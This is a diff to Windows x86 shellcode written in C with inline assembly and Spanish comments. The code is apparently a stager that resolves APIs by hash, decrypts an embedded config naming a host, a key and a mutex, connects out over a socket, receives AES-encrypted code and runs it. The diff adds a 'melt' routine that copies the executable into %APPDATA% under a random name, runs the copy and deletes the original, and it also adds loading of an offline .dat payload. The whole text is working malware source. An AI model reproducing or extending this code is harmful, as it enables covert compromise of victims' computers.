@@ -56,8 +56,8 @@ find_delta:
         #endif //SC_NULL
 #endif //SC_DELTA
 
-        //Saltamos los hashes.
-        jmp  over_hashes
+        //Saltamos los hashes y funciones.
+        jmp  over_fncnhashes
     }
 #pragma region constantes
         /*###############################################################################
@@ -71,13 +71,19 @@ find_delta:
         *###############################################################################*/
 #pragma region hashes
 kernel32_symbol_hashes:
-        #define kernel32_count  6
+        #define kernel32_count  12
         API_DEFINE(LoadLibraryA, ('L') ('o') ('a') ('d') ('L') ('i') ('b') ('r') ('a') ('r') ('y') ('A'))
         API_DEFINE(GetProcAddress, ('G') ('e') ('t') ('P') ('r') ('o') ('c') ('A') ('d') ('d') ('r') ('e') ('s') ('s'))
         API_DEFINE(Sleep, ('S') ('l') ('e') ('e') ('p'))
         API_DEFINE(ExitProcess, ('E') ('x') ('i') ('t') ('P') ('r') ('o') ('c') ('e') ('s') ('s'))
         API_DEFINE(VirtualAlloc, ('V') ('i') ('r') ('t') ('u') ('a') ('l') ('A') ('l') ('l') ('o') ('c'))
         API_DEFINE(CreateMutexA, ('C') ('r') ('e') ('a') ('t') ('e') ('M') ('u') ('t') ('e') ('x') ('A'))
+        API_DEFINE(GetTempFileNameA, ('G') ('e') ('t') ('T') ('e') ('m') ('p') ('F') ('i') ('l') ('e') ('N') ('a') ('m') ('e') ('A'))
+        API_DEFINE(CopyFileA, ('C') ('o') ('p') ('y') ('F') ('i') ('l') ('e') ('A'))
+        API_DEFINE(DeleteFileW, ('D') ('e') ('l') ('e') ('t') ('e') ('F') ('i') ('l') ('e') ('W'))
+        API_DEFINE(WinExec, ('W') ('i') ('n') ('E') ('x') ('e') ('c'))
+        API_DEFINE(CreateFileA, ('C') ('r') ('e') ('a') ('t') ('e') ('F') ('i') ('l') ('e') ('A'))
+        API_DEFINE(ReadFile, ('R') ('e') ('a') ('d') ('F') ('i') ('l') ('e'))
 
 ws2_32_symbol_hashes:
         #define ws2_32_count    7
@@ -95,10 +101,12 @@ advapi32_symbol_hashes:
         API_DEFINE(CryptSetKeyParam, ('C') ('r') ('y') ('p') ('t') ('S') ('e') ('t') ('K') ('e') ('y') ('P') ('a') ('r') ('a') ('m'))
         API_DEFINE(CryptImportKey, ('C') ('r') ('y') ('p') ('t') ('I') ('m') ('p') ('o') ('r') ('t') ('K') ('e') ('y'))
         API_DEFINE(CryptDecrypt, ('C') ('r') ('y') ('p') ('t') ('D') ('e') ('c') ('r') ('y') ('p') ('t'))
-
 #pragma endregion
 
 #pragma region VARS
+        VAR_DEFINE(CommandLine)
+        VAR_DEFINE(APPDATA)
+        VAR_DEFINE(DAT_NFO)
         VAR_DEFINE(pHOST)
         VAR_DEFINE(pKEY)
         VAR_DEFINE(pMUTEX)
@@ -111,12 +119,27 @@ advapi32_symbol_hashes:
         CALC_STACKSIZE()
 //¡¡¡¡CONSTANTES TEMPORALES!!!!
     __asm{
+        /*###############################################################################
+        ** Subrutina que copia de ESI a EDI pasando 
+        ** de UNICODE a ASCII hasta encontrar el caracter que haya en DL
+        *###############################################################################*/
+copy_uni_to_ascii_filter:
+copy_next:
+        lodsb                           //Cargamos byte
+        cmp  al, dl                     //¿Es el caracter que buscamos?
+        jz copy_done                    //Si lo es hemos acabado...
+        stosb                           //Guardamos el byte
+        inc esi                         //Saltamos el nulo
+        jmp copy_next                   //Siguiente carácter
+copy_done:
+        ret
+
 #ifdef ERR_CHECK
-/*###############################################################################
-** gtfo:
-**    Método para salir en cualquier momento de la ejecución sin mostrar ningún
-**    error crítico, además es usado para tener una mejor idea de lo ocurrido
-*###############################################################################*/
+        /*###############################################################################
+        ** gtfo:
+        **    Método para salir en cualquier momento de la ejecución sin mostrar ningún
+        **    error crítico, además es usado para tener una mejor idea de lo ocurrido
+        *###############################################################################*/
 gtfo:
         pop  edx
         test eax, eax
@@ -127,6 +150,7 @@ conti:
         push edx
         ret
 #endif //ERR_CHECK
+
 CreateBuff:
         cdq                             //EDX = 0
         push PAGE_EXECUTE_READWRITE     //v
@@ -139,9 +163,9 @@ CreateBuff:
         call gtfo                       //>(EAX!=0)? No ha habido error, tenemos donde guardar los datos
 #endif //ERR_CHECK
         ret
-over_hashes:
+over_fncnhashes:
         //Saltamos sobre la configuración
-        jmp  over_config
+        jmp  to_start
     }
 config_start:
 KEY:   	//typedef struct aes128Blob{
@@ -156,10 +180,7 @@ KEY:   	//typedef struct aes128Blob{
             //SHA1("karcrack:1234")
         //}
 MUTEX:  //EMIT_BYTE_ARRAY(('S') ('t') ('e') ('a') ('l') ('t') ('h')(0))
-HOST:   //EMIT_BYTE_ARRAY(('1') ('2') ('7') ('.') ('0') ('.') ('0') ('.') ('1')(0))
-        //PADDING
-        //EMIT_DWORD(0)
-        //EMIT_DWORD(0)
+HOST:   //EMIT_BYTE_ARRAY(('1') ('9') ('2') ('.') ('1') ('6') ('8') ('.') ('0') ('.') ('6') ('6')(0))
         EMIT_BYTE_ARRAY((0x9C) (0x57) (0xFF) (0xFF) (0xC6) (0x17) (0x72) (0xB1) (0xC0) (0x0D) (0xA7) (0xD1) (0xC6) (0x25) (0x45) (0x9F) (0xF5) (0x95) (0xF7) (0xD5) (0xA4) (0x63) (0x17) (0xD0) (0x77) (0xAF) (0xFC) (0xE0) (0x04) (0x97) (0xAB) (0xC4) (0xBC) (0x79) (0xCF) (0xD1) (0x94) (0x1F) (0x29) (0xD7) (0xA4) (0x7B) (0xCF) (0xD1) (0xF9) (0x71) (0x72) (0xB1))
 
 #define CONFIG_SIZE 52
@@ -167,8 +188,7 @@ HOST:   //EMIT_BYTE_ARRAY(('1') ('2') ('7') ('.') ('0') ('.') ('0') ('.') ('1')(
 config_end:
 #pragma endregion
     __asm{
-over_config:
-start:
+to_start:
         /*###############################################################################
         ** Creación del stack de direcciones:
         **    Lo primero que hacemos es reservar espacio en el stack para almacenar
@@ -176,21 +196,53 @@ start:
         **    Utilizaremos durante todo el código EBP como puntero al inicio de este
         **    'stack de direcciones'
         *###############################################################################*/
-        sub  esp, (STACKSIZE)
-        mov  ebp, esp
-
+        pushc(STACKSIZE)
+        pop  eax
+        sub  esp, eax 
+        lea  ebp, [esp+0x40]
+#ifdef SC_DELTA
+        push edi                        //Guardamos el Delta
+#endif //SC_DELTA
         /*###############################################################################
         ** Carga de APIs:
         **    Iniciamos el proceso de carga de APIs.
         **    Primero se obtendrá el puntero a kernel32 después se cargarán sus funciones,
         **    entre ellas LoadLibraryA(), con ésta se cargarán el resto de librerias.
         *###############################################################################*/
-
+        
         //Obtenemos en eax la dirección de kernel32
         push 0x30                       //v
         pop  esi                        //v
         lods DWORD PTR FS:[esi]         //>EAX = &(PEB)
-        mov  esi, [eax+0x0C]            //ESI = PEB->Ldr
+        push [eax+0x0C]                 //Guardamos en el stack PEB->Ldr
+        mov  eax, [eax+0x10]            //EAX = &RTL_USER_PROCESS_PARAMETERS
+        /*###############################################################################
+        ** Obtención de %APPDATA%:
+        ** Aprovechamos que hemos sacado el PEB para obtener kernel32 y
+        ** recorremos el bloque de environments en busca de \0APPDATA=*
+        *###############################################################################*/
+        mov  edi, [eax+0x44]            //v
+        inc  edi                        //v
+        inc  edi                        //>Saltamos el '"'
+        mov  [ebp+_CommandLine], edi    //>Almacenamos el puntero a CommandLine
+        mov  esi, [eax+0x48]            //ESI = Environment
+
+hash_start:
+        xor  ebx, ebx                   //EBX = 0 = hash
+redo:   lodsw                           //AX = Environment[i]; i++
+        test al, al                     //(AL == 0)?
+        jz   hash_start                 //Si el caracter es nulo volvemos a empezar...
+next:   xor  bl, al                     //hash ^= Environment[i]
+        cmp  al, '='                    //(AL == '=')?
+        jne  redo                       //Si no se trata de un igual cargamos el siguiente caracter
+        cmp  bl, 0x6C                   //Si es un igual comprobamos si el hash equivale al de "APPDATA"
+        jne  redo                       //En caso negativo seguimos buscando.
+appdata_found:
+
+        //ESI = &APPDATA
+        mov  [ebp+_APPDATA], esi        //Almacenamos el puntero a APPDATA (UNICODE)
+
+        pop  esi                        //ESI = PEB->Ldr
         mov  esi, [esi+0x1C]            //ESI = PEB->Ldr.InInitOrder[0]
 next_module:
         mov  eax, [esi+0x20]            //EAX = PEB->Ldr.InInitOrder[X].module_name (UNICODE)
@@ -199,17 +251,18 @@ next_module:
         mov  esi, [esi]                 //ESI = PEB->Ldr.InInitOrder[X].flink (NextModule)
         jne  next_module
 find_kernel32_finished:
-
 #ifdef SC_DELTA
-        push edi                        //Guardamos el Delta
-#endif
+        pop  edi                        //Restauramos EDI
+        push edi                        //Y guardamos otra vez
+#endif //SC_DELTA
         movr(esi, kernel32_symbol_hashes)// Puntero al primer hash
         movr(edi, LoadFunctions)        // Puntero a LoadFunctions()
 
+        sub  ebp, 0x40                  //Apuntamos al inicio de Stack
         //Cargamos las APIs de kernel32 en la pila a partir de los hashes
         push kernel32_count             //v Número de hashes de kernel32
         call edi                        //>LoadFunctions(kernel32_count);
-        mov  ebx, [ebp-(kernel32_count*4)+_LoadLibraryA]//EBX = &LoadLibraryA
+        mov  ebx, [ebp-(kernel32_count*4)+_LoadLibraryA+0x40]//EBX = &LoadLibraryA
 
         //Obtenemos la BaseAddress de ws2_32
         pushc('23')                     //v
@@ -238,16 +291,25 @@ find_kernel32_finished:
         add  esp, 0xC                   //Reparamos el stack después de las llamadas a LoadFunctions()
 #ifdef SC_DELTA
         pop  edi                        //Recuperamos el Delta
-#endif
+#endif //SC_DELTA
         //Volvemos a apuntar al inicio del stack de APIs
-        sub  ebp, (kernel32_count+ws2_32_count+advapi32_count)*4
+        sub  ebp, (kernel32_count+ws2_32_count+advapi32_count)*4 - 0x40
 
         //Creamos un buffer para almacenar la configuración cifrada y luego descifrarla.
-
         movr(esi, config_start)         //Cargamos la posición del inicio de la config
+
+        /*###############################################################################
+        **        TRAS ESTE PUNTO YA NO NECESITAMOS ALMACENAR EL DELTA (EDI)
+        *###############################################################################*/
+
+        /*###############################################################################
+        ** Descifrado y almacenado de la configuración:
+        **   - Se descifra la configuración usando un packet XOR
+        *###############################################################################*/
         push CONFIG_SIZE                //v
         pop  eax                        //>EAX = CONFIG_SIZE
         call CreateBuff                 //>CreateBuff(CONFIG_SIZE);
+
         mov  edx, eax                   //EDX = &Buffer
 
 #pragma region DECRYPT_CONFIG
@@ -269,6 +331,9 @@ xornext:
         add  ebx, 0x8
         mov  [ebp+_pHOST], ebx
 
+        /*###############################################################################
+        **                          Comprobación del Mutex
+        *###############################################################################*/
         cdq                             //EDX = 0
         push [ebp+_pMUTEX]              //v
         push edx                        //v
@@ -285,9 +350,122 @@ xornext:
 #else //ERR_CHECK
         test eax, eax
         jz  nomtx
+        push ERR_MTX
         call [ebp+_ExitProcess]
 nomtx:
 #endif //ERR_CHECK
+        /*###############################################################################
+        ** Realizamos el Melt:
+        **   - Primero nos copiamos a %APPDATA%\XXXX.exe
+        **   - Después ejecutamos la copia pasándole de parámetro nuestra ruta.
+        **
+        **   - La copia se encarga de eliminarnos.
+        *###############################################################################*/
+        /*###############################################################################
+        **      EN CASO DE NO HABER MELT NECESITAMOS IGUALMENTE OBTENER 
+        **                LA RUTA A LOS DATOS OFFLINE
+        *###############################################################################*/
+#ifdef MELT
+        mov  edi, [ebp+_CommandLine]    //EDI = &CommandLine
+        push edi                        //Guardamos &CommandLine para luego
+        mov  esi, [ebp+_APPDATA]        //ESI = &APPDATA
+        //Comprobamos si estamos en %APPDATA%
+next_char:
+        cmpsw                           //Comprobamos el caracter y pasamos al siguiente
+        je   next_char                  //Si coincide probamos con el siguiente
+        cmp  [esi-2], bh                //Si no coincide miramos si es el ultimo char de APPDATA
+        je   do_not_copy                //Si es el \0 la ruta coincide y por lo tanto no nos copiamos
+
+        pushc(256)                      //v
+        pop  eax                        //>EAX = 512
+        call CreateBuff                 //Creamos Buffer para las rutas
+
+        mov  edi, eax                   //EDI = EAX
+        mov  esi, [ebp+_APPDATA]        //ESI = &APPDATA
+        mov  [ebp+_APPDATA], edi        //Guardamos en _APPDATA la nuestra nueva ruta
+
+        //Copiamos %APPDATA% en el buffer
+        mov  al, '"'                    //v
+        stosb                           //>Metemos la comilla de apertura
+        cdq                             //v EDX = 0
+        call copy_uni_to_ascii_filter   //>Y pasamos de UNICODE a ASCII hasta encontrar un \0
+
+        //Por ahora &_APPDATA = >>"%APPDATA%<<
+        //Añadimos a %APPDATA% un nombre al azar.
+        cdq                             //EDX = 0
+        push edi                        //v
+        push edx                        //v
+        push edx                        //v
+        push edi                        //v
+        call [ebp+_GetTempFileNameA]    //>GetTempFileNameA(Buff, NULL, 0, Buff);
+        mov  DWORD PTR[edi+5], 'exe.'   //Reemplazamos la extensión a ".exe"
+        
+        //Ahora &_APPDATA = >>"%APPDATA%\XXXX.exe\0<<
+        pop  esi                        //Recuperamos el puntero a &CommandLine
+        lea  edi, [edi+11]              //Saltamos el \0\0 que luego será comilla de cierre y espacio
+        push edi                        //Guardamos el puntero para luego
+
+        mov  dl, '"'                    //v
+        call copy_uni_to_ascii_filter   //> Pasamos de UNICODE a ASCII hasta encontrar una comilla
+
+        //&_APPDATA = >>"%APPDATA%\XXXX.exe\0\0%MyPath%<<
+        pop  edi                        //Recuperamos el puntero a nuestra ruta
+        cdq                             //EDX = 0
+        push edx                        //v
+        push [ebp+_APPDATA]             //v
+        inc  DWORD PTR[esp]             //(Saltamos la comilla)
+        push edi                        //v
+        call [ebp+_CopyFileA]           //>CopyFileA(&MyPath, &APPDATA, false);
+
+        dec  edi                        //v
+        dec  edi                        //>Volvemos a \0\0 que se transformará a >>" <<
+        mov  ax, ' "'                   //v
+        stosw                           //>Metemos las comillas y el espacio
+
+        //&_APPDATA = >>"%APPDATA%\XXXX.exe" %MyPath%<<
+        //Ejecutamos nuestra copia pasándole nuestra ruta
+        push 1                          //V
+        push [ebp+_APPDATA]             //v
+        call [ebp+_WinExec]             //>WinExec(&_APPDATA, SW_SHOWNORMAL);
+
+        push MELT_DONE                  //v
+        call [ebp+_ExitProcess]         //>ExitProcess(MELT_DONE);
+
+do_not_copy://(Somos la copia)
+        //Vamos a finalizar el Melt eliminando el fichero que se nos pasa
+        pop  esi                        //Recuperamos el inicio &CommandLine (=LIMPIAR STACK)
+        //EDI = Puntero a nuestro nombre de ejecutable
+        mov  cl, 0x7F                   //TAMAÑO MÁXIMO PARA NUESTRO NOMBRE + EXT
+        xor  eax, eax                   //v
+        mov  al, '"'                    //> EAX = '"'
+        repne scasw                     //>Buscamos en EDI la comilla
+        inc  edi                        //v
+        inc  edi                        //>Saltamos el espacio
+        //EDI = Puntero al fichero a eliminar
+        push edi                        //v
+        call [ebp+_DeleteFileW]         //>DeleteFileW(&file_to_delete);
+#endif //MELT
+        mov  esi, [ebp+_CommandLine]
+        pushc(256)
+        pop  eax
+        call CreateBuff
+        mov  edi, eax
+        mov  [ebp+_DAT_NFO], edi       //Almacenamos la ruta del .dat que contiene las cosas offline
+        mov  dl, '"'                    //v
+        call copy_uni_to_ascii_filter   //> Pasamos de UNICODE a ASCII hasta encontrar una comilla
+        //EDI apunta ahora al final de nuestra ruta.
+        mov  DWORD PTR[edi-4], 'tad.'   //Cambiamos la ruta
+
+        cdq                             //EDX = 0
+        push edx                        //v
+        push edx                        //v
+        push OPEN_EXISTING              //v
+        push edx                        //v
+        push edx                        //v
+        pushc(GENERIC_READ)             //v
+        push [ebp+_DAT_NFO]             //v
+        call [ebp+_CreateFileA]         //>CreateFileA(&DAT_PATH, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
+        mov  [ebp+_DAT_NFO], eax        //Guardamos el handle al fichero
 
 #define BUFF_SIZE 0x5000
 _cont:  xor  eax, eax                   //EAX = 0
@@ -331,7 +509,22 @@ newSocket:
         call [ebp+_WSASocketA]          //>WSASocketA(AF_INET, SOCK_STREAM, 0, 0, 0, 0);
         mov  [ebp+_hSocket], eax        //hSocket = EAX
 
+        jmp  connect_loop
 sleep_and_loop:
+        cmp  DWORD PTR[ebp+_DAT_NFO], -1
+        je   do_the_loop
+        cdq                             //EDX = 0
+        push edx                        //v
+        push edx                        //v
+        push esp                        //v
+        xor  eax, eax                   //EAX = 0
+        mov  ah, 0x50                   //EAX = BUFF_SIZE
+        push eax                        //v
+        push [ebp+_pBuff]               //v
+        push [ebp+_DAT_NFO]             //v
+        call [ebp+_ReadFile]            //>ReadFile(hFile, &pBuff, 5000, &read, NULL)
+        pop  edx
+do_the_loop:
 #ifdef SC_NULL
         push 0x7F                       //v
         shl  DWORD PTR[esp], 0x3        //v
@@ -437,9 +630,8 @@ init_decrypt:
         call [ebp+_CryptSetKeyParam]    //>CryptSetKeyParam(hKey, KP_IV, (BYTE*)IV, 0);
 
         //Restamos el IV a los datos
-        //add  DWORD PTR[ebp+_pBuff], 16          //pBuff+= 16
-        sub  DWORD PTR[ebp+_buffLen], 16        //buffLen-= 16
-        push [ebp+_buffLen]                     //Guardamos SizeOfPayLoad+4
+        sub  DWORD PTR[ebp+_buffLen], 16//buffLen-= 16
+        push [ebp+_buffLen]             //Guardamos SizeOfPayLoad+4
 
         //Finalmente desciframos los datos obtenidos
         //Los datos se encuentran en el paquete así: IV(16Bytes)+DataEncrypt
@@ -487,15 +679,11 @@ FNV1a:
         push [ebp+_hKey]                //v
         push [ebp+_hSocket]             //v
         push [ebp+_GetProcAddress]      //v
-#ifdef SC_NULL
-        mov  eax, ebp
-        push [eax]                      //v
-#else //SC_NULL
         push [ebp+_LoadLibraryA]        //v
-#endif //SC_NULL
         mov  eax, [ebp+_pBuff]          //v
-        add  eax, 0x14                  // Saltamos hasta el cargador_IAT
-        call eax                        //>cargador_IAT(&LoadLibraryA, &GetProcAddress, hSocket, &KEY);
+        add  eax, 0x14                  // Saltamos hasta el loader
+        call eax                        //>loader(&LoadLibraryA, &GetProcAddress, hSocket, &KEY);
+
         //En caso de que haya habido algún error no crítico el loader me devuelve la ejecución
         jmp KillSocket                  //Reiniciamos el bucle de espera
     }
